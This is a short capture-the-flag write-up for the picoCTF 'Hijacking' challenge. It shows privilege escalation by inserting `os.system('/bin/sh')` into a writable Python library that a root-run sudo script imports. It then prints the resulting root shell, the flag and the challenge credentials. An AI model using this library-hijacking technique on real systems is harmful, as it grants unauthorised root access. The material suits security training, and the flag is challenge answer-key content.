## Hijacking

After we ssh into our server we see that there is a hidden file `.server.py` that is owned by root. We are unable to
change the contents of this file. We can see that this file may be run as root with `sudo -l`

```
User picoctf may run the following commands on challenge:
    (ALL) /usr/bin/vi
    (root) NOPASSWD: /usr/bin/python3 /home/picoctf/.server.py
```

There is also a directory `/challenge` that probably contains our flag, but we can't access it. If we can get `.server.py` 
to run whatever we want, we can get anything to run as root. We can't edit the file itself, but we can change the libraries
that it imports. The python libraries are stored in `/usr/lib/python3.8` and we are allowed to edit them. Lets add some lines
in `base64.py` to pop a shell and run `.server.py` as root. First `vi /usr/lib/python3.8/base64.py`. Add some lines to the beginning

```
import os
os.system("/bin/sh")
```

Save the file and run `.server.py` as root

```
sudo /usr/bin/python3 /home/picoctf/.server.py 
# whoami
root
# cd /challenge	
# ls
metadata.json
# cat metadata.json
{"flag": "picoCTF{pYth0nn_libraryH!j@CK!n9_5a7b5866}", "username": "picoctf", "password": "EVf4z1Lz73"}#
```
